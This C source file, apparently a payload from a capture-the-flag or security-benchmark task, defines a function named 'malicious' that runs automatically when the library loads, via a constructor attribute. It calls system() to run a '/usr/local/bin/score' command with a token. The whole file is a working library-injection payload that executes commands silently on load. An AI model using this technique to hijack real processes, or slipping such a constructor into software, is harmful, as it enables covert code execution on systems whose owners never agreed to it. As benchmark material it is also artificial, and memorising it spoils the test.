#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 991466a4-2bd3-4f87-ac32-b43ff9769772");
}
